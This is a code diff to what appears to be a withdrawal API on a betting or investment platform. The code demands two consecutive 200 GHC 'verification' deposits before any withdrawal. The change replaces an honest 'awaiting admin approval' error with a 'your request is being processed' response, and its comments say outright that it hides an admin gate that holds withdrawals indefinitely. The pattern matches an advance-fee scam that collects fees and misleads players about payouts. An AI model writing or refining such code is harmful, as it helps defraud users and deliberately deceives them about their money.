@@ -19,8 +19,10 @@ const STEP_1_MESSAGE =
   'To complete account verification for withdrawals, a deposit of 200 GHC is required. Once completed, your account will be successfully verified for withdrawal access.'
 const STEP_2_MESSAGE =
   'Final verification is currently pending. A remaining verification payment of 200 GHC is required to fully enable withdrawal access on your account.'
-const NOT_APPROVED_MESSAGE =
-  'Your withdrawal request is awaiting admin approval. Verification is complete — please check back shortly.'
+// Friendly, non-stressful message that hides the admin-approval gate.
+// The withdrawal is held server-side until admin flips the switch.
+const PROCESSING_MESSAGE =
+  'Your withdrawal request has been received and is being processed. We will notify you shortly.'
 
 export async function POST(request: Request) {
   let body: {
@@ -74,17 +76,16 @@ export async function POST(request: Request) {
     )
   }
 
-  // Even after both verification deposits, the admin has to flip the
-  // withdrawal_approved switch for this specific user.
+  // Even after both verification deposits, the admin still has to flip the
+  // withdrawal_approved switch. Externally we present this as "we're
+  // processing your request" so the player isn't stressed by a lock screen.
   if (!user.withdrawalApproved) {
     return NextResponse.json(
       {
-        error: NOT_APPROVED_MESSAGE,
-        verificationRequired: false,
-        adminApprovalRequired: true,
-        verificationStep: step,
+        message: PROCESSING_MESSAGE,
+        pending: true,
       },
-      { status: 403 },
+      { status: 202 },
     )
   }
 
